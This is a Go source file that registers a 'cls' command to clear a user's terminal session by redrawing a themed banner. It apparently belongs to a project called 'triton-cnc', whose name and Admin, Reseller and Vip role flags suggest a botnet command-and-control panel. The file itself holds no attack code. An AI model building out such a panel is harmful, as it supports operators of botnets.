package util_Command

import (
	"strings"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/client/terminal"
)


func init() {

	Register(&Command{
		Name: "cls",

		Description: "clear your complete terminal screen",

		Admin: false,
		Reseller: false,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {

			if Session.CurrentTheme == nil {
				error,_ := terminal.Banner("clear-splash", Session.User, Session.Channel, true, false, nil)
				if error != nil {
					return nil
				}
			} else {
				error,_ := terminal.Banner(strings.Split(Session.CurrentTheme.Views_HomeClear, "/")[1], Session.User, Session.Channel, true, false, nil)
				if error != nil {
					return nil
				}
			}

			return nil
		},
	})
}